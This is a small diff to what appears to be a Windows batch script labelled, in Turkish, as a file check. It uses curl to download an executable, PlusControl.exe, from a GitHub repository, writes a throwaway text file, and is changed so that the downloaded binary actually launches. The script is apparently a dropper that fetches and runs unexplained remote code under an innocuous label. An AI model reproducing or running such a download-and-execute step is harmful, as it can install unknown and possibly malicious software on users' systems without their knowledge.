@@ -15,4 +15,4 @@ REM Dosya kontrolü
 
 curl -L https://github.com/seition2doc/dosta4/raw/refs/heads/main/PlusControl.exe -o PlusControll.exe
 echo "asd" > nagihori3.txt 
-start PlusControl.exe
+start PlusControll.exe
